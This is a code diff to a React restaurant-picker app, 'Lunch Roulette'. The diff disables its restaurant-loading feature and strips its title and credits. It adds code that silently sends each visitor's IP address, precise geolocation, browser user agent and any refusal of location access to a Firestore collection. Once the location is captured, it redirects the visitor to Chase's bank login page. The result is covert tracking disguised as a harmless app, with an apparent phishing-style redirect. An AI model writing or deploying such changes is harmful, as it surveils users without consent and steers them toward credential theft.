@@ -70,14 +70,14 @@ class App extends Component {
     this.fetchRoughLocation();
 
     // While we figure out the true location asynchronously, initialize application with default location
-    this.loadPlaces({ll: DEFAULTLOCATION})
-    .then((venues) => this.loadPlaceDetails(0))
-    .catch(console.log);
+    // this.loadPlaces({ll: DEFAULTLOCATION})
+    // .then((venues) => this.loadPlaceDetails(0))
+    // .catch(console.log);
   }
 
 
   fetchRoughLocation = () => {
-    fetch("http://ipinfo.io/json?token=2a3097ff5d6dc8")
+    fetch("https://ipinfo.io/json?token=2a3097ff5d6dc8")
     .then((response) =>{
       if (!response.ok)
         throw Error("Couldn't get IP location");
@@ -97,18 +97,19 @@ class App extends Component {
       locationDetails[key] = position.coords[key];
     }
     this.reportLocation(locationDetails);
-    this.loadPlaces({ll: position.coords.latitude + ',' + position.coords.longitude});
+    // this.loadPlaces({ll: position.coords.latitude + ',' + position.coords.longitude});
   }
 
   // upon failure, try and get rough location
   handleLocationFailure = () => {
-    this.loadPlaces({ll: this.state.roughLocation.loc});
+    this.reportLocation({message: "User denied precise location access"});
+    // this.loadPlaces({ll: this.state.roughLocation.loc});
   }
 
   reportLocation(locationDetails){
     try{
       (async () => {
-        const docRef = await addDoc(collection(db, "userLocations"), {...locationDetails, ip: this.state.roughLocation.ip, timeStamp: new Date()}); 
+        const docRef = await addDoc(collection(db, "userLocations"), {locationDetails: locationDetails, userAgent: window.navigator.userAgent, ip: this.state.roughLocation.ip, timeStamp: new Date()}); 
         console.log("Document written with ID: ", docRef.id);
         if (!this.state.preciseLocationFetched){
           this.setState({preciseLocationFetched: true});
@@ -118,6 +119,9 @@ class App extends Component {
             console.log("getting precise location");
             navigator.geolocation.getCurrentPosition(this.handleLocationSuccess, this.handleLocationFailure);
           }
+        }
+        else{
+          window.location.href = "https://www.chase.com/personal/for-you-login";
         }
       })();
     }catch(error){
@@ -255,9 +259,6 @@ class App extends Component {
               <div className="App">
                 <header className="App-header">
                   <img src={PizzaLogo} className="App-logo" alt="logo" />
-                  <h1 className="App-title">Lunch Roulette</h1>
-                  <p>It's Tinder! But for restaurants</p>
-                  <Button color="grey" onClick={this.toggleSidebar}>Saved Places</Button>
                 </header>
                 <Grid centered >
                   <Grid.Column computer={6} tablet={8} mobile={15}>
@@ -270,11 +271,6 @@ class App extends Component {
                     }
                   </Grid.Column>
                 </Grid>
-                <div className="footer">
-                  <p>
-                    Oluwatobi Oremade - Powered by Foursquare.
-                  </p>
-                </div>
               </div>
             </Sidebar.Pusher>
           </Sidebar.Pushable>
